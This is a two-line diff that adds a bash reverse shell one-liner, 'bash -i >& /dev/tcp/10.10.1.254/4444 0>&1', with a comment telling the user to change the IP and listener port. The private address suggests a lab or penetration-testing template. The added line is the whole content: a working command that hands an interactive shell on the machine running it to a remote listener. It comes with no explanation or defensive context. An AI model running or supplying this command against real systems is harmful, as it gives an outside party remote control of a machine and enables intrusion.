@@ -1,0 +1,2 @@
+# Change the IP and the listener port 
+bash -i >& /dev/tcp/10.10.1.254/4444 0>&1
